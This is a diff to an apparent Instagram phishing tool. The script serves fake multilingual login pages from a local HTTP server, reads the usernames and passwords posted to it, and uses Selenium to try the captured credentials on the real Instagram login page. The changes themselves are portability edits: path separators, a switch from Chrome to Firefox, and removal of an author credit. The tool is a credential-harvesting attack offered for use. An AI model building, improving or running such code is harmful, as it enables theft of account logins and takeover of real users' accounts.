@@ -1,7 +1,5 @@
-# This tool was developed by a developer named Rickidevs
-# please rate this project on github out of respect
-# https://github.com/Rickidevs 🌟
-
+import os
+import platform
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from colorama import Fore, init
 import argparse
@@ -13,6 +11,7 @@ from urllib.parse import unquote
 import socket
 import time
 from datetime import datetime
+from webdriver_manager.firefox import GeckoDriverManager
 
 init()
 
@@ -45,32 +44,34 @@ for account in accounts:
 
 print(Fore.RESET)
 
+path_separator = '\\' if platform.system() == 'Windows' else '/'
+
 language_mapping = {
-    'ar': "htmls\\ar.html",
-    'az': "htmls\\az.html",
-    'ch': "htmls\\ch.html",
-    'en': "htmls\\index.html",
-    'fr': "htmls\\fr.html",
-    'de': "htmls\\de.html",
-    'it': "htmls\\it.html",
-    'ko': "htmls\\ko.html",
-    'ru': "htmls\\ru.html",
-    'es': "htmls\\es.html",
-    'tr': "htmls\\tr.html"
+    'ar': f"htmls{path_separator}ar.html",
+    'az': f"htmls{path_separator}az.html",
+    'ch': f"htmls{path_separator}ch.html",
+    'en': f"htmls{path_separator}index.html",
+    'fr': f"htmls{path_separator}fr.html",
+    'de': f"htmls{path_separator}de.html",
+    'it': f"htmls{path_separator}it.html",
+    'ko': f"htmls{path_separator}ko.html",
+    'ru': f"htmls{path_separator}ru.html",
+    'es': f"htmls{path_separator}es.html",
+    'tr': f"htmls{path_separator}tr.html"
 }
 
 error_pages = {
-    'ar': "errors_htmls\\errorar.html",
-    'az': "errors_htmls\\erroraz.html",
-    'ch': "errors_htmls\\errorch.html",
-    'en': "errors_htmls\\errordef.html",
-    'fr': "errors_htmls\\errorfr.html",
-    'de': "errors_htmls\\errorde.html",
-    'it': "errors_htmls\\errorit.html",
-    'ko': "errors_htmls\\errorko.html",
-    'ru': "errors_htmls\\errorru.html",
-    'es': "errors_htmls\\errores.html",
-    'tr': "errors_htmls\\errortr.html"
+    'ar': f"errors_htmls{path_separator}errorar.html",
+    'az': f"errors_htmls{path_separator}erroraz.html",
+    'ch': f"errors_htmls{path_separator}errorch.html",
+    'en': f"errors_htmls{path_separator}errordef.html",
+    'fr': f"errors_htmls{path_separator}errorfr.html",
+    'de': f"errors_htmls{path_separator}errorde.html",
+    'it': f"errors_htmls{path_separator}errorit.html",
+    'ko': f"errors_htmls{path_separator}errorko.html",
+    'ru': f"errors_htmls{path_separator}errorru.html",
+    'es': f"errors_htmls{path_separator}errores.html",
+    'tr': f"errors_htmls{path_separator}errortr.html"
 }
 
 help_menu = f"""{Fore.WHITE}
@@ -92,7 +93,7 @@ login_check = False
 
 def check_turst(username, password):
     global login_check
-    driver = webdriver.Chrome()
+    driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())
     driver.implicitly_wait(0)
     driver.get("https://www.instagram.com/accounts/login/")
 
@@ -231,7 +232,7 @@ def start_server(web_site, port, output_file, redirect_location, check_trust):
         
         def do_POST(self):
             global login_check
-            error_web = error_pages.get(web_site.split('\\')[-1].split('.')[0], "errors_htmls\\errordef.html")
+            error_web = error_pages.get(web_site.split(path_separator)[-1].split('.')[0], f"errors_htmls{path_separator}errordef.html")
             try:
                 content_length = int(self.headers['Content-Length'])
                 post_data = self.rfile.read(content_length).decode('utf-8')
@@ -291,4 +292,3 @@ def start_server(web_site, port, output_file, redirect_location, check_trust):
 
 if __name__ == "__main__":
     main()
-
